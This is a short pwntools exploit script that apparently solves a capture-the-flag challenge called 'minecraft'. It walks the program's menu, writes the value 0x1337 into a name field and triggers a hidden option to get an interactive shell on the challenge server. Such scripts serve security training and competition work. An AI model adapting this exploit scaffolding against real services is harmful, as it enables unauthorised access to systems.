from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./minecraft"
libc_path = "./libc.so.6"

elf, rop = ELF(vuln_path), ROP(vuln_path)
# libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    io = process([vuln_path])
    # io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("minecraft.chal.cyberjousting.com", 1354)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))


payload = b""
io.sendlineafter("username now: \n", b"tinyfat")

data = b""
while b"Please input your first and last name:" not in data:
   io.sendlineafter("6. Leave\n", b"3")
   data = io.recvline()

io.sendline(b"tinyfat")
io.send(p32(0x1337))


io.sendlineafter("6. Leave\n", b"5")
io.sendlineafter("username now: \n", b"tinyfat")
# io.sendlineafter("6. Leave\n", b"1")
# io.sendlineafter("username now: \n", b"tinyfat")
ddebug("breakrva 0x018A9\ncontinue")
io.sendlineafter("6. Leave\n", b"7")

io.interactive()

